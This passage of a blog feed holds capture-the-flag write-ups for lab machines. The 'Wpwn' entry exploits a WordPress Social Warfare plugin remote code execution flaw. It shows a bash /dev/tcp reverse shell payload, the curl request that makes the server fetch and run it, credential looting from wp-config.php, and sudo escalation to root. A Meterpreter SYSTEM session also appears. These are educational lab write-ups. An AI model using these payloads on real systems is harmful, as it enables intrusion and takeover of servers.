&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200262 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.113.117
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 3 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.4.1.61:4444 -&amp;gt; 10.10.113.117:49208&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-10 21:59:19 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; getuid
Server username: NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and successfully compromise the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt;.&lt;/p&gt;</content><author><name></name></author><category term="thm" /><category term="windows" /><category term="bof" /><summary type="html">Summary Gatekeeper is vulnerable to Buffer Overflow attack. We attain the initial access by exploiting the service running on port 31337. We can escalate our privilege via the outdated kernel version.</summary></entry><entry><title type="html">Wpwn - OSPG</title><link href="https://jayngng.github.io/blog/wpwn-ospg/" rel="alternate" type="text/html" title="Wpwn - OSPG" /><published>2021-09-10T20:55:23+10:00</published><updated>2021-09-10T20:55:23+10:00</updated><id>https://jayngng.github.io/blog/wpwn---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/wpwn-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;social-warfare&lt;/code&gt; plugin of the target system is vulnerable to &lt;strong&gt;Unauthenticated Remote Code Execution&lt;/strong&gt;. After obtained the initial access, we can then compromise a local user via &lt;strong&gt;plaintext credentials&lt;/strong&gt; found in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; config file. Finally, privilege escalation is achieved through misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; permission.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/services.txt 192.168.162.123
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (text/html).
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s us further investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service running on port 80.&lt;/p&gt;

&lt;h4 id=&quot;web-application&quot;&gt;&lt;strong&gt;Web Application&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; - a hidden web directories scanner as below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/common.txt | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;ffuf/http.txt
index.html              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 23, Words: 4, Lines: 4]
robots.txt              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 57, Words: 10, Lines: 3]
server-status           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 280, Words: 20, Lines: 10]
wordpress               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 322, Words: 20, Lines: 10]
:: Progress: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4686/4686] :: Job &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1/1] :: 156 req/sec :: Duration: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:00:33] :: Errors: 0 ::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; directory appears interesting for additional enumerations.&lt;/p&gt;

&lt;h4 id=&quot;wpscan&quot;&gt;&lt;strong&gt;WPScan&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;To effectively enumerate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt;, we employ a tool called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s us see how we can use the tool to enumerate &lt;strong&gt;all users and available plugins&lt;/strong&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On the terminal, we run the following command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.162.123/wordpress/ &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; u,ap &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10
_______________________________________________________________
         __          _______   _____
         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|
          &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __ ®
           &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;&apos;_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_| 
         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18 
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...
[+] social-warfare
 | Location: http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |                                    
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)          
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.162.123/wordpress/, Match: &apos;&lt;/span&gt;Social Warfare v3.5.2&lt;span class=&quot;s1&quot;&gt;&apos;
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/wp-content/plugins/social-warfare/readme.txt
...
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.162.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection) 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Analyzing the outputs, we discover the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;social-warfare v3.5.2&lt;/code&gt; plugin and the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, we drop our attention toward the plugin. That said, we can test whether it is commonly exploitable with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit wordpress social warfare
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                              |  Path
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
WordPress Plugin Social Warfare &amp;lt; 3.5.3 - Remote Code Execution                                                                                             | php/webapps/46794.py
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;social-warfare--unauthenticated-rce&quot;&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;social-warfare&lt;/code&gt; → Unauthenticated RCE&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;There is a high chance that our target is vulnerable to the attack. In order to test our theory, we run the following commands.&lt;/p&gt;

&lt;p&gt;[1]. Create a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.txt&lt;/code&gt;, which stores a reverse shell.&lt;/p&gt;

&lt;p&gt;Example content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;pre&amp;gt;system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.162/53 0&amp;gt;&amp;amp;1&quot;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[2]. Start a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; server using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[3]. Trigger the payload.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.162.123/wordpress/wp-admin/admin-post.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;swp_debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;load_options&lt;span class=&quot;se&quot;&gt;\&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;swp_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://192.168.49.162/payload.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the final command is executed, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 53                                                                                                                                                                           1 ⨯
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 53 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.162] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.162.123] 51492
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;514&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@wpwn:/var/www/html/wordpress/wp-admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;plaintext-password&quot;&gt;&lt;strong&gt;Plaintext Password&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-config.php&lt;/code&gt; file divulges a plaintext password of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordpress&lt;/code&gt; database.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@wpwn:/var/www/html/wordpress&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;wp-config.php
&amp;lt;?php
...
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_NAME&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;wordpress_db&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            
/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_USER&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;wp_user&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       
/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;DB_PASSWORD&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;R3&amp;amp;]vzhHmMn9,:-5&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Try to login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;takis&lt;/code&gt; user with the password, we are luckily secured a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;takis&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;sudo-permisson&quot;&gt;&lt;strong&gt;Sudo Permisson&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;From the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;takis&lt;/code&gt; shell, we can execute any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;takis@wpwn:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;takis on wpwn:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User takis may run the following commands on wpwn:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: ALL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and flexibly compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;takis@wpwn:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
root@wpwn:/home/takis# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="linux" /><summary type="html">Summary social-warfare plugin of the target system is vulnerable to Unauthenticated Remote Code Execution. After obtained the initial access, we can then compromise a local user via plaintext credentials found in a wordpress config file. Finally, privilege escalation is achieved through misconfigured sudo permission.</summary></entry><entry><title type="html">Exfiltrated - OSPG</title><link href="https://jayngng.github.io/blog/exfiltrated-ospg/" rel="alternate" type="text/html" title="Exfiltrated - OSPG" /><published>2021-09-09T08:30:29+10:00</published><updated>2021-09-09T08:30:29+10:00</updated><id>https://jayngng.github.io/blog/exfiltrated---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/exfiltrated-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;In this writeup, we’ll exploit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subrion v4.2.1&lt;/code&gt; CMS to secure the inital foothold. We’ll then escalate our privilege via a &lt;strong&gt;crontab&lt;/strong&gt; service that executes the exploitable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/services.txt
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inspecting the outputs, we hit on a few compelling directories of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service.&lt;/p&gt;

&lt;p&gt;Navigating to each of them, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/panel/&lt;/code&gt; directory redirects us to a new page.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt;/panel/                      
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;                                                                                
&amp;lt;html &lt;span class=&quot;nv&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;en&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ltr&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                                                                    
    &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                     
        &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
        &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IE=Edge&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                                 
        &amp;lt;title&amp;gt;Login :: Powered by Subrion 4.2&amp;lt;/title&amp;gt;                                         
